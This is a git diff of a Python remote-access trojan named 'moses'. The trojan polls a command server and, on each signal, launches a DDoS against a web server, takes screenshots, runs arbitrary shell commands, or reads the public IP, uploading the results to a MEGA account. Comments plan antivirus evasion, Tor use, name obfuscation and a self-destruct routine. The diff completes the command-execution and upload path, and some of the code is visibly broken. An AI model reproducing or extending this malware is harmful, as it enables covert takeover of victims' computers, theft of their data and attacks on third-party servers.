@@ -3,11 +3,13 @@ from mega import Mega
 from datetime import datetime
 #exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('BASE64 ENCODED PROGRAM GOES HERE')))
 
+# TODO: cut down on extra-modules...
 # TODO: obfuscate all function and variable names after completion
 # TODO: setup tor capability
 # TODO: change all os.system commands to subprocess (check ssh_chat program)
 # TODO: COMPLETE THE PROGRAM, as it is still under construction and currently incomplete
 # TODO: check anti-virus evasion/efficacy again
+# TODO: implement kill command
 
 # NOTE: READ INSTRUCTIONS BELOW
 #
@@ -20,14 +22,14 @@ from datetime import datetime
 #
 
 def main():
-    #death() # self destruct
-
     URL = "http://website.tld" #NO SLASH AT THE END OF THE URL
-    master_filename = "moses.exe"
+    master_filename = "moses.py"
 
     win_user = get_win_user()
 
     path = ["\\AppData\\Roaming\\", "\\AppData\\Local\\"] # TODO: add more paths to store moses.exe
+
+    #do_i_die(master_filename) # self destruct
 
     for x in path:
         # this is fucky so it won't trigger av (as of now, it works...)
@@ -68,11 +70,11 @@ def main():
             ddos_target_web_server(target, stop_time)
         elif (signal == "2"): # take_screenshot()
             take_screenshot(win_user)
-        elif (signal == "3"): # get_pub_ip_address()
-            get_pub_ip_address(sys_username)
-        elif (signal == "4"): # execute_command()
+        elif (signal == "3"): # execute_command()
             command = get_web_content(URL, "2")
-            execute_command(command)
+            execute_command(command, win_user)
+        elif (signal == "4"): # get_pub_ip_address()
+            get_pub_ip_address(win_user)
         # TODO
         #elif (signal == "3"):
         #    download_file()
@@ -93,17 +95,16 @@ def get_web_content(URL, wb_path):
         web_content = ""
     return web_content
 
-def death():
+# kill module
+def do_i_die():
     if (check_platform() == "32-bit"):
-        os.remove("asd.py")
+        os.remove(master_filename)
 
-# used for getting system username
 def get_win_user():
     win_user = getpass.getuser()
 
     return win_user
 
-# used for getting current system time
 def get_current_time():
     now = datetime.now()
     current_time = now.strftime("%H:%M") #24-hour clock format
@@ -184,20 +185,27 @@ def take_screenshot(win_user): # 2
 
     upload_file(filename)
 
-def execute_command(command): # subprocess here... output the stdout to a variable, a text file, to mega, then remove
+def execute_command(command, win_user): # subprocess here... output the stdout to a variable, a text file, to mega, then remove
+    counter = 0
+
     while (True):
         try:
             filename = get_current_time()
             filename = str(filename.replace(":", ""))
-            filename = filename + sys_username + ".txt"
+            filename = filename + win_user + ".txt"
 
             try:
-                stdout = subprocess.check_output([command])
-            except subprocess.CalledProcessError as stdout:
-                stdout = stdout
+                stdout = os.popen(command).read()
+            except:
+                stdout = ":: could not execute command"
 
             f = open(filename, "w")
             f.write(stdout)
+            f.close()
+
+            upload_file(filename)
+
+            break
         except:
             counter += 1
 
@@ -207,7 +215,7 @@ def execute_command(command): # subprocess here... output the stdout to a variab
             break
 
 # TODO: test this
-def get_pub_ip_address(sys_username):
+def get_pub_ip_address(win_user):
     # TODO: edit the get_web_content() function to take full URLs in the future
     try:
         response = urllib.request.urlopen("http://icanhazip.com")
@@ -215,7 +223,7 @@ def get_pub_ip_address(sys_username):
 
         filename = get_current_time()
         filename = str(filename.replace(":", ""))
-        filename = filename + sys_username + ".txt"
+        filename = filename + win_user + ".txt"
 
         f = open(filename, "w")
         f.write(ip_address)
@@ -223,7 +231,7 @@ def get_pub_ip_address(sys_username):
 
         upload_file(filename)
     except:
-        web_content = ""
-    return web_content
+        ip_address = ""
+    return ip_address
 
 main()
